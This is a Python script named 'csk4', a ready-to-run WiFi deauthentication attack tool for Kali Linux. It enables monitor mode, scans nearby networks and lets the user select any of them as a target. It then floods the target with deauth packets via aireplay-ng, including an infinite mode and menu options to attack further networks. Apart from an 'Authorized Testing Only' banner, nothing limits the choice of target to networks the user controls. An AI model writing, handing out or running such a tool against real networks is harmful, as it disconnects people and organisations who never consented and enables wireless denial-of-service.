#!/usr/bin/env python3
# ============================================================
#  csk4 - Complete WiFi Deauthentication Tool
#  Auto Scan → Select → Deauth
#  Kali Linux | Authorized Testing Only
# ============================================================

import os
import sys
import csv
import time
import signal
import subprocess
import re
import threading
import shutil

# ---------- Colors ----------
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
CYAN = '\033[0;36m'
WHITE = '\033[1;37m'
BOLD = '\033[1m'
NC = '\033[0m'
CLEAR = '\033[2J\033[H'

VERSION = "1.0"
MON_INTERFACE = None
ORIGINAL_INTERFACE = None
MON_CLEANUP_NEEDED = False

# ---------- Signal Handler ----------
def signal_handler(sig, frame):
    print(f"\n\n{YELLOW}[!] Ctrl+C detected. Cleaning up...{NC}")
    cleanup()
    print(f"{GREEN}[✓] Cleanup complete. Exiting.{NC}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ---------- Cleanup ----------
def cleanup():
    global MON_INTERFACE, MON_CLEANUP_NEEDED
    if MON_INTERFACE and MON_CLEANUP_NEEDED:
        subprocess.run(['airmon-ng', 'stop', MON_INTERFACE],
                       capture_output=True, text=True)
    # Remove temp files
    for f in os.listdir('/tmp'):
        if f.startswith('csk4_scan'):
            try:
                os.remove(f'/tmp/{f}')
            except:
                pass
    # Restart network manager in background
    subprocess.Popen(['systemctl', 'restart', 'NetworkManager'],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ---------- Banner ----------
def show_banner():
    print(f"{CLEAR}{CYAN}", end="")
    print("    ╔══════════════════════════════════════════╗")
    print("    ║                                          ║")
    print("    ║     ██████ ███████ ██   ██ ██   ██      ║")
    print("    ║    ██      ██      ██  ██  ██   ██      ║")
    print("    ║    ██      ███████ █████   ███████      ║")
    print("    ║    ██           ██ ██  ██       ██      ║")
    print("    ║     ██████ ███████ ██   ██      ██      ║")
    print("    ║                                          ║")
    print("    ╚══════════════════════════════════════════╝")
    print(f"{NC}")
    print(f"  {YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
    print(f"  {GREEN}  WiFi Deauth Tool v{VERSION}{NC}")
    print(f"  {RED}  ⚠ Authorized Testing Only ⚠{NC}")
    print(f"  {YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
    print()

# ---------- Root Check ----------
def check_root():
    if os.geteuid() != 0:
        print(f"{RED}[✗] Root privileges required!{NC}")
        print(f"{YELLOW}    Usage: sudo python3 csk4{NC}")
        sys.exit(1)

# ---------- Dependency Check ----------
def check_deps():
    missing = []
    for cmd in ['aireplay-ng', 'airmon-ng', 'airodump-ng', 'iwconfig']:
        if not shutil.which(cmd):
            missing.append(cmd)
    
    if missing:
        print(f"{RED}[✗] Missing tools: {', '.join(missing)}{NC}")
        print(f"{YELLOW}    Install: sudo apt-get install aircrack-ng wireless-tools{NC}")
        sys.exit(1)
    print(f"{GREEN}[✓] All dependencies found{NC}")

# ---------- Detect Interface ----------
def detect_interface():
    global ORIGINAL_INTERFACE
    try:
        # Method 1: iw dev
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'Interface' in line:
                iface = line.split()[-1]
                if not iface.endswith('mon'):
                    ORIGINAL_INTERFACE = iface
                    return iface
        
        # Method 2: iwconfig
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            match = re.match(r'^(wl\S+)', line)
            if match:
                iface = match.group(1)
                if not iface.endswith('mon'):
                    ORIGINAL_INTERFACE = iface
                    return iface
    except:
        pass
    return None

# ---------- Enable Monitor Mode ----------
def enable_monitor(iface):
    global MON_INTERFACE, MON_CLEANUP_NEEDED
    
    print(f"{YELLOW}[*] Killing interfering processes...{NC}")
    subprocess.run(['airmon-ng', 'check', 'kill'],
                   capture_output=True, text=True)
    time.sleep(1)
    
    print(f"{YELLOW}[*] Enabling monitor mode on {iface}...{NC}")
    result = subprocess.run(['airmon-ng', 'start', iface],
                           capture_output=True, text=True)
    
    # Find the new monitor interface
    try:
        r = subprocess.run(['iwconfig'], capture_output=True, text=True)
        for line in r.stdout.split('\n'):
            if 'Mode:Monitor' in line:
                MON_INTERFACE = line.split()[0]
                break
    except:
        pass
    
    if not MON_INTERFACE:
        MON_INTERFACE = f"{iface}mon"
    
    # Verify
    time.sleep(1)
    print(f"{GREEN}[✓] Monitor mode: {MON_INTERFACE}{NC}")
    MON_CLEANUP_NEEDED = True
    return MON_INTERFACE

# ---------- Scan Networks ----------
def scan_networks(iface, duration=7):
    temp_file = '/tmp/csk4_scan'
    
    # Remove old files
    for f in os.listdir('/tmp'):
        if f.startswith('csk4_scan'):
            try:
                os.remove(f'/tmp/{f}')
            except:
                pass
    
    print(f"\n{YELLOW}[*] Scanning for WiFi networks... (please wait {duration} sec){NC}")
    
    # Run airodump-ng in background
    proc = subprocess.Popen(
        ['airodump-ng', '--output-format', 'csv',
         '-w', temp_file, iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # Show progress
    for i in range(duration):
        time.sleep(1)
        dots = '.' * (i + 1)
        spaces = ' ' * (duration - i - 1)
        print(f"\r{CYAN}  Scanning{dots}{spaces}{NC}", end='', flush=True)
    
    print(f"\r{GREEN}[✓] Scan complete!{NC}")
    proc.terminate()
    time.sleep(0.5)
    
    try:
        proc.kill()
    except:
        pass
    
    # Find the CSV file
    csv_file = None
    for f in os.listdir('/tmp'):
        if f.startswith('csk4_scan') and f.endswith('.csv'):
            csv_file = f'/tmp/{f}'
            break
    
    if not csv_file:
        print(f"{RED}[✗] Scan failed - no CSV output generated{NC}")
        return []
    
    # Parse CSV
    networks = []
    try:
        with open(csv_file, 'r', errors='ignore') as f:
            reader = csv.reader(f)
            in_aps = True
            for row in reader:
                if not row or len(row) < 3:
                    continue
                
                # Check if we've reached the clients section
                first_col = row[0].strip()
                if first_col == 'Station MAC' or first_col == 'BSSID':
                    continue
                
                # Check if this is a client row (has station MAC and BSSID)
                if in_aps and len(first_col.split(':')) == 6:
                    # Validate it's an AP entry (has ESSID-like column)
                    if len(row) >= 14:
                        bssid = row[0].strip().upper()
                        channel = row[3].strip()
                        power = row[8].strip()
                        essid = row[13].strip()
                        enc = row[5].strip()
                        
                        # Skip if power is -1 (not visible enough)
                        if power == '-1':
                            continue
                        
                        if essid == '' or essid == ' ':
                            essid = '<Hidden SSID>'
                        
                        # Filter out malformed entries
                        if len(bssid.split(':')) == 6:
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'power': power,
                                'essid': essid,
                                'enc': enc
                            })
    except Exception as e:
        print(f"{RED}[!] Error parsing scan: {e}{NC}")
    
    # Remove duplicates (keep strongest signal)
    seen_bssid = {}
    for net in networks:
        b = net['bssid']
        if b not in seen_bssid:
            seen_bssid[b] = net
        else:
            # Keep stronger signal
            try:
                if int(net['power']) > int(seen_bssid[b]['power']):
                    seen_bssid[b] = net
            except:
                pass
    
    networks = list(seen_bssid.values())
    
    # Sort by signal strength (strongest first)
    def sort_key(n):
        try:
            return int(n['power'])
        except:
            return -100
    networks.sort(key=sort_key, reverse=True)
    
    return networks

# ---------- Display Networks ----------
def display_networks(networks):
    if not networks:
        print(f"{RED}[!] No networks found in range!{NC}")
        print(f"{YELLOW}    Try moving closer or using an external adapter.{NC}")
        return False
    
    print(f"\n{BLUE}╔{'═'*75}╗{NC}")
    print(f"{BLUE}║{NC} {WHITE}{'#':<4} {'BSSID':<18} {'CH':<4} {'PWR':<5} {'ENC':<12} {'ESSID':<30}{NC}{BLUE}║{NC}")
    print(f"{BLUE}║{'═'*75}║{NC}")
    
    for i, net in enumerate(networks, 1):
        bssid = net['bssid']
        ch = net['channel']
        pwr = net['power']
        enc = net['enc'] if net['enc'] else 'OPEN'
        essid = net['essid']
        
        # Truncate ESSID if too long
        if len(essid) > 28:
            essid = essid[:25] + '...'
        
        # Color by signal strength
        try:
            pwr_int = int(pwr)
            if pwr_int >= -50:
                pwr_color = GREEN
            elif pwr_int >= -70:
                pwr_color = YELLOW
            else:
                pwr_color = RED
        except:
            pwr_color = WHITE
        
        print(f"{BLUE}║{NC} {GREEN}{i:<4}{NC} {CYAN}{bssid:<18}{NC} {ch:<4} {pwr_color}{pwr:<5}{NC} {enc:<12} {essid:<30}{BLUE}║{NC}")
    
    print(f"{BLUE}╚{'═'*75}╝{NC}")
    print()
    return True

# ---------- Get User Selection ----------
def get_selection(networks):
    while True:
        try:
            choice = input(f"{YELLOW}[?] Select network number (1-{len(networks)}): {NC}").strip()
            if not choice:
                print(f"{RED}[!] Please enter a number!{NC}")
                continue
            
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                return networks[idx]
            else:
                print(f"{RED}[!] Number must be between 1 and {len(networks)}!{NC}")
        except ValueError:
            print(f"{RED}[!] Please enter a valid number!{NC}")

# ---------- Get Deauth Count ----------
def get_deauth_count():
    print(f"\n{YELLOW}How many deauth packets to send?{NC}")
    print(f"  {CYAN}•{NC} Enter a number (1-10000)")
    print(f"  {CYAN}•{NC} Enter {RED}0{NC} for continuous (infinite)")
    print(f"  {CYAN}•{NC} Press Enter for default: {GREEN}100{NC}")
    
    while True:
        try:
            choice = input(f"{YELLOW}[?] Count: {NC}").strip()
            if choice == '':
                return 100
            count = int(choice)
            if count == 0:
                return 0  # Continuous
            elif 1 <= count <= 10000:
                return count
            else:
                print(f"{RED}[!] Count must be between 1 and 10000 (or 0 for infinite)!{NC}")
        except ValueError:
            print(f"{RED}[!] Please enter a valid number!{NC}")

# ---------- Send Deauth ----------
def send_deauth(bssid, count, iface):
    print(f"\n{BLUE}═══════════════════════════════════════════{NC}")
    print(f"{WHITE}  Target BSSID : {bssid}{NC}")
    if count == 0:
        print(f"{WHITE}  Deauth Mode  : CONTINUOUS (Ctrl+C to stop){NC}")
    else:
        print(f"{WHITE}  Deauth Count : {count}{NC}")
    print(f"{WHITE}  Interface    : {iface}{NC}")
    print(f"{BLUE}═══════════════════════════════════════════{NC}")
    
    # Ask for confirmation
    confirm = input(f"\n{RED}[!] Start attack? (y/N): {NC}").strip().lower()
    if confirm != 'y':
        print(f"{CYAN}[i] Attack cancelled.{NC}")
        return False
    
    print(f"\n{GREEN}[+] Starting deauth attack...{NC}")
    
    if count == 0:
        print(f"{YELLOW}[*] Sending deauth continuously. Press Ctrl+C to stop.{NC}")
    else:
        print(f"{YELLOW}[*] Sending {count} deauth packet(s)...{NC}")
    
    print()
    
    # Build command
    cmd = ['aireplay-ng', '-0', str(count), '-a', bssid, '-D', iface]
    
    try:
        result = subprocess.run(cmd)
        if result.returncode == 0:
            if count == 0:
                print(f"\n{GREEN}[✓] Continuous deauth stopped by user.{NC}")
            else:
                print(f"\n{GREEN}[✓] {count} deauth burst(s) sent successfully!{NC}")
            return True
        else:
            print(f"\n{RED}[✗] Deauth failed with exit code: {result.returncode}{NC}")
            print(f"{YELLOW}    Debug: {' '.join(cmd)}{NC}")
            return False
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Deauth stopped by user.{NC}")
        return True
    except Exception as e:
        print(f"\n{RED}[✗] Error: {e}{NC}")
        return False

# ---------- Post-Attack Menu ----------
def post_menu(networks, iface):
    while True:
        print(f"\n{BLUE}═══════════════════════════════════════════{NC}")
        print(f"{WHITE}  What next?{NC}")
        print(f"{BLUE}═══════════════════════════════════════════{NC}")
        print(f"  {GREEN}[1]{NC} Rescan & attack another network")
        print(f"  {GREEN}[2]{NC} Attack same network again")
        print(f"  {GREEN}[3]{NC} Exit")
        
        choice = input(f"\n{YELLOW}[?] Choose (1-3): {NC}").strip()
        
        if choice == '1':
            return 'rescan'
        elif choice == '2':
            return 'same'
        elif choice == '3':
            return 'exit'
        else:
            print(f"{RED}[!] Invalid choice!{NC}")

# ---------- Main ----------
def main():
    show_banner()
    check_root()
    check_deps()
    
    # Detect interface
    print(f"{YELLOW}[*] Detecting wireless interface...{NC}")
    iface = detect_interface()
    if not iface:
        print(f"{RED}[✗] No wireless interface found!{NC}")
        print(f"{YELLOW}    Connect a WiFi adapter and try again.{NC}")
        sys.exit(1)
    print(f"{GREEN}[✓] Interface: {iface}{NC}")
    
    # Enable monitor mode
    mon_iface = enable_monitor(iface)
    
    while True:
        # Scan
        networks = scan_networks(mon_iface)
        if not display_networks(networks):
            retry = input(f"\n{YELLOW}[?] Rescan? (Y/n): {NC}").strip().lower()
            if retry == 'n':
                break
            continue
        
        # Select target
        target = get_selection(networks)
        bssid = target['bssid']
        essid = target['essid']
        
        print(f"\n{GREEN}[✓] Selected: {essid} ({bssid}){NC}")
        
        # Get count
        count = get_deauth_count()
        
        # Send deauth
        send_deauth(bssid, count, mon_iface)
        
        # Post menu
        action = post_menu(networks, mon_iface)
        if action == 'rescan':
            continue
        elif action == 'same':
            # Ask count again
            count = get_deauth_count()
            send_deauth(bssid, count, mon_iface)
        elif action == 'exit':
            break
    
    cleanup()
    print(f"\n{GREEN}[✓] CSK4 session ended. Stay ethical!{NC}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted.{NC}")
        cleanup()
    except Exception as e:
        print(f"\n{RED}[✗] Unexpected error: {e}{NC}")
        cleanup()
